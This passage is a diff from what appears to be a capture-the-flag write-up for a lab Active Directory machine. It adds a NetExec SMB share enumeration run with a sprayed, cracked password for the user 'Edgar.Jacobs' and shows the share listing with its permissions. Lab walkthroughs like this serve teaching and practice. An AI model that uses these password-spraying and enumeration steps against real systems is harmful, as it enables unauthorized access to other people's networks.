@@ -342,3 +342,20 @@ nxc smb research.search.htb -u users.txt -p '@3ONEmillionbaby' --continue-on-suc
 SMB         10.129.229.57   445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby
 ```
 I have compromised another user!
+
+```python
+nxc smb research.search.htb -u edgar.jacobs -p '@3ONEmillionbaby' --shares
+SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby 
+SMB         10.129.229.57   445    RESEARCH         [*] Enumerated shares
+SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
+SMB         10.129.229.57   445    RESEARCH         -----           -----------     ------
+SMB         10.129.229.57   445    RESEARCH         ADMIN$                          Remote Admin
+SMB         10.129.229.57   445    RESEARCH         C$                              Default share
+SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.129.229.57   445    RESEARCH         helpdesk        READ            
+SMB         10.129.229.57   445    RESEARCH         IPC$            READ            Remote IPC
+SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share 
+SMB         10.129.229.57   445    RESEARCH         RedirectedFolders$ READ,WRITE      
+SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share
+```
